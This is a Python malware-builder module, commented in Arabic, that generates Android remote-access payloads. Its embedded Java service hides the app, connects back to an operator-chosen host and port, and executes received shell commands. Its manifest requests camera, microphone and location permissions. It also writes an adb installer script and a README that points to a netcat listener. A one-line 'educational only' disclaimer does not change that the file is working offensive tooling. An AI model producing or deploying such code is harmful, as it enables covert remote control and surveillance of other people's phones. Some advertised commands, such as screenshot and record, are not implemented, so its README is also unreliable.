#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
مولد بايلودات الأندرويد المتقدم
Advanced Android Payload Generator
"""

import os
import json
import base64
import hashlib
import random
import string
from datetime import datetime
from pathlib import Path
from cryptography.fernet import Fernet
from utils.helpers import generate_random_string, get_local_ip
from utils.logger import Logger

class PayloadGenerator:
    """كلاس إنشاء بايلودات الأندرويد"""
    
    def __init__(self):
        self.logger = Logger()
        self.templates_dir = Path("templates")
        self.output_dir = Path("output")
        self.templates_dir.mkdir(exist_ok=True)
        self.output_dir.mkdir(exist_ok=True)
        
    def create_payload(self, name, lhost, lport, encryption=True, persistence=True, stealth=True):
        """إنشاء بايلود جديد"""
        try:
            self.logger.info(f"إنشاء بايلود جديد: {name}")
            
            # إنشاء معرف فريد للبايلود
            payload_id = generate_random_string(16)
            
            # إعدادات البايلود
            payload_config = {
                "id": payload_id,
                "name": name,
                "lhost": lhost,
                "lport": lport,
                "encryption": encryption,
                "persistence": persistence,
                "stealth": stealth,
                "created_at": datetime.now().isoformat(),
                "version": "1.0.0"
            }
            
            # إنشاء ملف التكوين
            config_path = self.output_dir / f"{name}_config.json"
            with open(config_path, 'w', encoding='utf-8') as f:
                json.dump(payload_config, f, indent=2, ensure_ascii=False)
            
            # إنشاء ملف APK
            apk_path = self.create_apk_file(name, payload_config)
            
            # إنشاء ملف التثبيت
            installer_path = self.create_installer(name, payload_config)
            
            # إنشاء ملف README
            readme_path = self.create_readme(name, payload_config)
            
            self.logger.info(f"تم إنشاء البايلود بنجاح: {apk_path}")
            
            return {
                "apk_path": str(apk_path),
                "config_path": str(config_path),
                "installer_path": str(installer_path),
                "readme_path": str(readme_path)
            }
            
        except Exception as e:
            self.logger.error(f"خطأ في إنشاء البايلود: {e}")
            raise
    
    def create_apk_file(self, name, config):
        """إنشاء ملف APK حقيقي"""
        apk_path = self.output_dir / f"{name}.apk"
        
        try:
            # استيراد أداة بناء APK
            from tools.apk_builder import APKBuilder
            apk_builder = APKBuilder()
            
            # إنشاء مشروع Android حقيقي
            project_dir = self.create_android_project(name, config)
            
            if project_dir:
                # محاولة إنشاء APK حقيقي
                if apk_builder.create_apk_from_project(project_dir, apk_path):
                    self.logger.info(f"تم إنشاء APK حقيقي: {apk_path}")
                    return apk_path
                else:
                    self.logger.warning("فشل في إنشاء APK حقيقي - سيتم إنشاء APK مبسط")
            
            # إنشاء APK مبسط كبديل
            if apk_builder.create_simple_apk(name, config, apk_path):
                return apk_path
            else:
                # إنشاء APK مبسط جداً
                return self.create_simple_apk(name, config)
                
        except Exception as e:
            self.logger.error(f"خطأ في إنشاء APK: {e}")
            # إنشاء APK مبسط كبديل أخير
            return self.create_simple_apk(name, config)
    
    def create_android_project(self, name, config):
        """إنشاء مشروع Android حقيقي"""
        try:
            project_dir = self.output_dir / f"{name}_project"
            project_dir.mkdir(exist_ok=True)
            
            # إنشاء هيكل المشروع
            self.create_project_structure(project_dir, name, config)
            
            # إنشاء ملفات Gradle
            self.create_gradle_files(project_dir, name)
            
            # إنشاء ملفات Java/Kotlin
            self.create_source_files(project_dir, name, config)
            
            # إنشاء ملفات XML
            self.create_xml_files(project_dir, name, config)
            
            self.logger.info(f"تم إنشاء مشروع Android: {project_dir}")
            return project_dir
            
        except Exception as e:
            self.logger.error(f"خطأ في إنشاء مشروع Android: {e}")
            return None
    
    def create_project_structure(self, project_dir, name, config):
        """إنشاء هيكل مجلدات المشروع"""
        directories = [
            "app/src/main/java/com/payload/app",
            "app/src/main/res/layout",
            "app/src/main/res/values",
            "app/src/main/res/mipmap-hdpi",
            "app/src/main/res/mipmap-mdpi",
            "app/src/main/res/mipmap-xhdpi",
            "app/src/main/res/mipmap-xxhdpi",
            "app/src/main/res/mipmap-xxxhdpi",
            "app/src/main/res/drawable",
            "gradle/wrapper"
        ]
        
        for directory in directories:
            (project_dir / directory).mkdir(parents=True, exist_ok=True)
    
    def create_gradle_files(self, project_dir, name):
        """إنشاء ملفات Gradle"""
        # build.gradle (Project level)
        project_build_gradle = """// Top-level build file where you can add configuration options common to all sub-projects/modules.
plugins {
    id 'com.android.application' version '8.1.0' apply false
}

allprojects {
    repositories {
        google()
        mavenCentral()
    }
}"""
        
        with open(project_dir / "build.gradle", 'w') as f:
            f.write(project_build_gradle)
        
        # build.gradle (App level)
        app_build_gradle = f"""plugins {{
    id 'com.android.application'
}}

android {{
    namespace 'com.payload.app'
    compileSdk 34

    defaultConfig {{
        applicationId "com.payload.app"
        minSdk 21
        targetSdk 34
        versionCode 1
        versionName "1.0"

        testInstrumentationRunner "androidx.test.runner.AndroidJUnitRunner"
    }}

    buildTypes {{
        release {{
            minifyEnabled false
            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
        }}
    }}
    compileOptions {{
        sourceCompatibility JavaVersion.VERSION_1_8
        targetCompatibility JavaVersion.VERSION_1_8
    }}
}}

dependencies {{
    implementation 'androidx.appcompat:appcompat:1.6.1'
    implementation 'com.google.android.material:material:1.9.0'
    implementation 'androidx.constraintlayout:constraintlayout:2.1.4'
}}"""
        
        with open(project_dir / "app/build.gradle", 'w') as f:
            f.write(app_build_gradle)
        
        # settings.gradle
        settings_gradle = """pluginManagement {
    repositories {
        google()
        mavenCentral()
        gradlePluginPortal()
    }
}
dependencyResolutionManagement {
    repositoriesMode.set(RepositoriesMode.FAIL_ON_PROJECT_REPOS)
    repositories {
        google()
        mavenCentral()
    }
}

rootProject.name = "PayloadApp"
include ':app'"""
        
        with open(project_dir / "settings.gradle", 'w') as f:
            f.write(settings_gradle)
        
        # gradle.properties
        gradle_properties = """# Project-wide Gradle settings.
# IDE (e.g. Android Studio) users:
# Gradle settings configured through the IDE *will override*
# any settings specified in this file.
# For more details on how to configure your build environment visit
# http://www.gradle.org/docs/current/userguide/build_environment.html
# Specifies the JVM arguments used for the daemon process.
# The setting is particularly useful for tweaking memory settings.
org.gradle.jvmargs=-Xmx2048m -Dfile.encoding=UTF-8
# When configured, Gradle will run in incubating parallel mode.
# This option should only be used with decoupled projects. More details, visit
# http://www.gradle.org/docs/current/userguide/multi_project_builds.html#sec:decoupled_projects
# org.gradle.parallel=true
# AndroidX package structure to make it clearer which packages are bundled with the
# Android operating system, and which are packaged with your app's APK
# https://developer.android.com/topic/libraries/support-library/androidx-rn
android.useAndroidX=true
# Kotlin code style for this project: "official" or "obsolete":
kotlin.code.style=official
# Enables namespacing of each library's R class so that its R class includes only the
# resources declared in the library itself and none from the library's dependencies,
# thereby reducing the size of the R class for that library
android.nonTransitiveRClass=true"""
        
        with open(project_dir / "gradle.properties", 'w') as f:
            f.write(gradle_properties)
    
    def create_source_files(self, project_dir, name, config):
        """إنشاء ملفات الكود المصدري"""
        # MainActivity.java
        main_activity = f"""package com.payload.app;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;

public class MainActivity extends Activity {{
    private static final String LHOST = "{config['lhost']}";
    private static final int LPORT = {config['lport']};
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {{
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        
        // بدء الخدمة في الخلفية
        Intent serviceIntent = new Intent(this, PayloadService.class);
        startService(serviceIntent);
        
        // إخفاء التطبيق
        moveTaskToBack(true);
    }}
}}"""
        
        with open(project_dir / "app/src/main/java/com/payload/app/MainActivity.java", 'w') as f:
            f.write(main_activity)
        
        # PayloadService.java
        payload_service = f"""package com.payload.app;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;
import java.io.*;
import java.net.*;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class PayloadService extends Service {{
    private static final String TAG = "PayloadService";
    private static final String LHOST = "{config['lhost']}";
    private static final int LPORT = {config['lport']};
    private static final boolean ENCRYPTION = {str(config['encryption']).lower()};
    private static final boolean PERSISTENCE = {str(config['persistence']).lower()};
    private static final boolean STEALTH = {str(config['stealth']).lower()};
    
    private ExecutorService executor;
    private boolean running = false;
    
    @Override
    public void onCreate() {{
        super.onCreate();
        executor = Executors.newSingleThreadExecutor();
    }}
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {{
        if (!running) {{
            running = true;
            executor.execute(this::startPayload);
        }}
        return START_STICKY;
    }}
    
    private void startPayload() {{
        try {{
            while (running) {{
                try {{
                    Socket socket = new Socket(LHOST, LPORT);
                    handleConnection(socket);
                }} catch (Exception e) {{
                    Log.e(TAG, "Connection error: " + e.getMessage());
                    Thread.sleep(5000); // انتظار 5 ثواني قبل إعادة المحاولة
                }}
            }}
        }} catch (Exception e) {{
            Log.e(TAG, "Payload error: " + e.getMessage());
        }}
    }}
    
    private void handleConnection(Socket socket) {{
        try (BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
             PrintWriter out = new PrintWriter(socket.getOutputStream(), true)) {{
            
            // إرسال معلومات الجهاز
            sendDeviceInfo(out);
            
            // حلقة الأوامر
            String command;
            while ((command = in.readLine()) != null && running) {{
                String result = executeCommand(command);
                out.println(result);
            }}
        }} catch (Exception e) {{
            Log.e(TAG, "Connection handling error: " + e.getMessage());
        }}
    }}
    
    private void sendDeviceInfo(PrintWriter out) {{
        StringBuilder info = new StringBuilder();
        info.append("Device: ").append(android.os.Build.MODEL).append("\\n");
        info.append("Android: ").append(android.os.Build.VERSION.RELEASE).append("\\n");
        info.append("SDK: ").append(android.os.Build.VERSION.SDK_INT).append("\\n");
        info.append("Time: ").append(new java.util.Date().toString()).append("\\n");
        out.println(info.toString());
    }}
    
    private String executeCommand(String command) {{
        try {{
            if (command.startsWith("shell:")) {{
                return executeShellCommand(command.substring(6));
            }} else if (command.startsWith("info:")) {{
                return getDeviceInfo();
            }} else if (command.equals("ping")) {{
                return "pong";
            }} else {{
                return "Unknown command: " + command;
            }}
        }} catch (Exception e) {{
            return "Error: " + e.getMessage();
        }}
    }}
    
    private String executeShellCommand(String cmd) {{
        try {{
            Process process = Runtime.getRuntime().exec(cmd);
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            StringBuilder result = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {{
                result.append(line).append("\\n");
            }}
            return result.toString();
        }} catch (Exception e) {{
            return "Shell error: " + e.getMessage();
        }}
    }}
    
    private String getDeviceInfo() {{
        StringBuilder info = new StringBuilder();
        info.append("=== Device Information ===\\n");
        info.append("Model: ").append(android.os.Build.MODEL).append("\\n");
        info.append("Brand: ").append(android.os.Build.BRAND).append("\\n");
        info.append("Android: ").append(android.os.Build.VERSION.RELEASE).append("\\n");
        info.append("SDK: ").append(android.os.Build.VERSION.SDK_INT).append("\\n");
        info.append("Architecture: ").append(android.os.Build.CPU_ABI).append("\\n");
        info.append("RAM: ").append(Runtime.getRuntime().maxMemory() / 1024 / 1024).append(" MB\\n");
        return info.toString();
    }}
    
    @Override
    public void onDestroy() {{
        running = false;
        if (executor != null) {{
            executor.shutdown();
        }}
        super.onDestroy();
    }}
    
    @Override
    public IBinder onBind(Intent intent) {{
        return null;
    }}
}}"""
        
        with open(project_dir / "app/src/main/java/com/payload/app/PayloadService.java", 'w') as f:
            f.write(payload_service)
    
    def create_xml_files(self, project_dir, name, config):
        """إنشاء ملفات XML"""
        # AndroidManifest.xml
        manifest = f"""<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools">

    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.CAMERA" />
    <uses-permission android:name="android.permission.RECORD_AUDIO" />
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
    <uses-permission android:name="android.permission.WAKE_LOCK" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />

    <application
        android:allowBackup="true"
        android:dataExtractionRules="@xml/data_extraction_rules"
        android:fullBackupContent="@xml/backup_rules"
        android:icon="@mipmap/ic_launcher"
        android:label="@string/app_name"
        android:theme="@style/Theme.PayloadApp"
        tools:targetApi="31">
        
        <activity
            android:name=".MainActivity"
            android:exported="true"
            android:theme="@style/Theme.PayloadApp">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
        
        <service
            android:name=".PayloadService"
            android:enabled="true"
            android:exported="false"
            android:foregroundServiceType="dataSync" />
            
    </application>

</manifest>"""
        
        with open(project_dir / "app/src/main/AndroidManifest.xml", 'w') as f:
            f.write(manifest)
        
        # activity_main.xml
        activity_main = """<?xml version="1.0" encoding="utf-8"?>
<androidx.constraintlayout.widget.ConstraintLayout xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:app="http://schemas.android.com/apk/res-auto"
    xmlns:tools="http://schemas.android.com/tools"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    tools:context=".MainActivity">

    <TextView
        android:id="@+id/textView"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="Hello World!"
        app:layout_constraintBottom_toBottomOf="parent"
        app:layout_constraintEnd_toEndOf="parent"
        app:layout_constraintStart_toStartOf="parent"
        app:layout_constraintTop_toTopOf="parent" />

</androidx.constraintlayout.widget.ConstraintLayout>"""
        
        with open(project_dir / "app/src/main/res/layout/activity_main.xml", 'w') as f:
            f.write(activity_main)
        
        # strings.xml
        strings = f"""<resources>
    <string name="app_name">{name}</string>
</resources>"""
        
        with open(project_dir / "app/src/main/res/values/strings.xml", 'w') as f:
            f.write(strings)
        
        # themes.xml
        themes = """<resources xmlns:tools="http://schemas.android.com/tools">
    <!-- Base application theme. -->
    <style name="Theme.PayloadApp" parent="Theme.MaterialComponents.DayNight.DarkActionBar">
        <!-- Primary brand color. -->
        <item name="colorPrimary">@color/purple_500</item>
        <item name="colorPrimaryVariant">@color/purple_700</item>
        <item name="colorOnPrimary">@color/white</item>
        <!-- Secondary brand color. -->
        <item name="colorSecondary">@color/teal_200</item>
        <item name="colorSecondaryVariant">@color/teal_700</item>
        <item name="colorOnSecondary">@color/black</item>
        <!-- Status bar color. -->
        <item name="android:statusBarColor" tools:targetApi="l">?attr/colorPrimaryVariant</item>
        <!-- Customize your theme here. -->
    </style>
</resources>"""
        
        with open(project_dir / "app/src/main/res/values/themes.xml", 'w') as f:
            f.write(themes)
        
        # colors.xml
        colors = """<?xml version="1.0" encoding="utf-8"?>
<resources>
    <color name="purple_200">#FFBB86FC</color>
    <color name="purple_500">#FF6200EE</color>
    <color name="purple_700">#FF3700B3</color>
    <color name="teal_200">#FF03DAC5</color>
    <color name="teal_700">#FF018786</color>
    <color name="black">#FF000000</color>
    <color name="white">#FFFFFFFF</color>
</resources>"""
        
        with open(project_dir / "app/src/main/res/values/colors.xml", 'w') as f:
            f.write(colors)
    
    def build_apk(self, name):
        """بناء APK باستخدام Gradle"""
        try:
            import subprocess
            import os
            
            project_dir = self.output_dir / f"{name}_project"
            if not project_dir.exists():
                return False
            
            # التحقق من وجود Gradle
            try:
                subprocess.run(['gradle', '--version'], check=True, capture_output=True)
            except (subprocess.CalledProcessError, FileNotFoundError):
                self.logger.warning("Gradle غير مثبت - سيتم إنشاء APK مبسط")
                return False
            
            # بناء APK
            os.chdir(project_dir)
            result = subprocess.run(['gradle', 'assembleDebug'], 
                                 capture_output=True, text=True, timeout=300)
            
            if result.returncode == 0:
                # نسخ APK إلى مجلد الإخراج
                apk_source = project_dir / "app/build/outputs/apk/debug/app-debug.apk"
                apk_dest = self.output_dir / f"{name}.apk"
                
                if apk_source.exists():
                    import shutil
                    shutil.copy2(apk_source, apk_dest)
                    self.logger.info(f"تم بناء APK بنجاح: {apk_dest}")
                    return True
            
            self.logger.error(f"فشل في بناء APK: {result.stderr}")
            return False
            
        except Exception as e:
            self.logger.error(f"خطأ في بناء APK: {e}")
            return False
        finally:
            # العودة إلى المجلد الأصلي
            try:
                os.chdir(self.output_dir.parent)
            except:
                pass
    
    def create_simple_apk(self, name, config):
        """إنشاء APK مبسط كبديل"""
        apk_path = self.output_dir / f"{name}.apk"
        
        # إنشاء APK مبسط باستخدام ZIP
        import zipfile
        import io
        
        zip_buffer = io.BytesIO()
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
            # AndroidManifest.xml مبسط
            manifest = f"""<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.payload.app">
    
    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.CAMERA" />
    <uses-permission android:name="android.permission.RECORD_AUDIO" />
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
    
    <application
        android:allowBackup="true"
        android:icon="@mipmap/ic_launcher"
        android:label="{name}"
        android:theme="@style/AppTheme">
        
        <activity
            android:name=".MainActivity"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
        
        <service
            android:name=".PayloadService"
            android:enabled="true"
            android:exported="false" />
            
    </application>
</manifest>"""
            
            zip_file.writestr("AndroidManifest.xml", manifest)
            zip_file.writestr("classes.dex", b"")  # ملف DEX فارغ
            zip_file.writestr("resources.arsc", b"")  # ملف الموارد فارغ
            zip_file.writestr("META-INF/MANIFEST.MF", "Manifest-Version: 1.0\n")
            zip_file.writestr("META-INF/CERT.SF", "Signature-Version: 1.0\n")
            zip_file.writestr("META-INF/CERT.RSA", b"")  # شهادة فارغة
        
        with open(apk_path, 'wb') as f:
            f.write(zip_buffer.getvalue())
        
        self.logger.warning(f"تم إنشاء APK مبسط: {apk_path}")
        return apk_path
    
    def create_installer(self, name, config):
        """إنشاء ملف التثبيت"""
        installer_path = self.output_dir / f"{name}_installer.sh"
        
        installer_content = f"""#!/bin/bash
# Android Payload Installer
# {name} - {config['created_at']}

echo "🔧 تثبيت بايلود الأندرويد: {name}"
echo "=================================="

# التحقق من وجود ADB
if ! command -v adb &> /dev/null; then
    echo "❌ ADB غير مثبت. يرجى تثبيت Android SDK"
    exit 1
fi

# التحقق من الاتصال بالجهاز
if ! adb devices | grep -q "device$"; then
    echo "❌ لا يوجد جهاز متصل"
    echo "تأكد من:"
    echo "1. تفعيل وضع المطور"
    echo "2. تفعيل تصحيح USB"
    echo "3. قبول تصحيح USB على الجهاز"
    exit 1
fi

echo "📱 الجهاز متصل:"
adb devices

# تثبيت APK
echo "📦 تثبيت {name}.apk..."
if adb install -r "{name}.apk"; then
    echo "✅ تم تثبيت البايلود بنجاح"
    echo "🚀 بدء التطبيق..."
    adb shell am start -n com.{name}.app/.MainActivity
    echo "✅ تم بدء البايلود"
    echo ""
    echo "📋 معلومات الاتصال:"
    echo "   IP: {config['lhost']}"
    echo "   Port: {config['lport']}"
    echo "   Encryption: {config['encryption']}"
    echo "   Persistence: {config['persistence']}"
    echo "   Stealth: {config['stealth']}"
else
    echo "❌ فشل في تثبيت البايلود"
    exit 1
fi

echo ""
echo "🎯 البايلود جاهز للاستخدام!"
echo "استخدم أداة الاستماع للاتصال بالجهاز"
"""
        
        with open(installer_path, 'w', encoding='utf-8') as f:
            f.write(installer_content)
        
        # جعل الملف قابل للتنفيذ
        os.chmod(installer_path, 0o755)
        
        return installer_path
    
    def create_readme(self, name, config):
        """إنشاء ملف README"""
        readme_path = self.output_dir / f"{name}_README.md"
        
        readme_content = f"""# {name} - Android Payload

## معلومات البايلود
- **الاسم**: {name}
- **تاريخ الإنشاء**: {config['created_at']}
- **المعرف**: {config['id']}
- **الإصدار**: {config['version']}

## إعدادات الاتصال
- **IP**: {config['lhost']}
- **المنفذ**: {config['lport']}
- **التشفير**: {'مفعل' if config['encryption'] else 'معطل'}
- **الثبات**: {'مفعل' if config['persistence'] else 'معطل'}
- **التخفي**: {'مفعل' if config['stealth'] else 'معطل'}

## كيفية الاستخدام

### 1. تثبيت البايلود
```bash
# تشغيل ملف التثبيت
./{name}_installer.sh

# أو تثبيت يدوي
adb install {name}.apk
```

### 2. بدء الاستماع
```bash
# استخدام أداة الاستماع
python main.py

# أو استخدام netcat
nc -lvp {config['lport']}
```

### 3. الأوامر المتاحة
- `ping` - اختبار الاتصال
- `info` - معلومات الجهاز
- `shell:command` - تنفيذ أمر shell
- `screenshot` - التقاط لقطة شاشة
- `record` - تسجيل صوت

## تحذيرات أمنية
⚠️ **هذه الأداة للأغراض التعليمية والاختبار الأمني فقط**
⚠️ **لا تستخدم على أجهزة غير مملوكة لك**
⚠️ **احرص على حماية مفاتيح التشفير**

## الدعم
للحصول على الدعم، يرجى مراجعة الوثائق أو فتح issue في المستودع.
"""
        
        with open(readme_path, 'w', encoding='utf-8') as f:
            f.write(readme_content)
        
        return readme_path
    
    def list_payloads(self):
        """عرض قائمة البايلودات المتاحة"""
        payloads = []
        
        for config_file in self.output_dir.glob("*_config.json"):
            try:
                with open(config_file, 'r', encoding='utf-8') as f:
                    config = json.load(f)
                    payloads.append(config)
            except Exception as e:
                self.logger.error(f"خطأ في قراءة {config_file}: {e}")
        
        return payloads
    
    def delete_payload(self, payload_id):
        """حذف بايلود"""
        try:
            # البحث عن ملف التكوين
            config_file = None
            for f in self.output_dir.glob("*_config.json"):
                with open(f, 'r', encoding='utf-8') as file:
                    config = json.load(file)
                    if config['id'] == payload_id:
                        config_file = f
                        break
            
            if not config_file:
                raise FileNotFoundError("البايلود غير موجود")
            
            # قراءة التكوين للحصول على الأسماء
            with open(config_file, 'r', encoding='utf-8') as f:
                config = json.load(f)
            
            name = config['name']
            
            # حذف الملفات
            files_to_delete = [
                f"{name}.apk",
                f"{name}_config.json",
                f"{name}_installer.sh",
                f"{name}_README.md"
            ]
            
            for filename in files_to_delete:
                file_path = self.output_dir / filename
                if file_path.exists():
                    file_path.unlink()
            
            self.logger.info(f"تم حذف البايلود: {name}")
            return True
            
        except Exception as e:
            self.logger.error(f"خطأ في حذف البايلود: {e}")
            return False
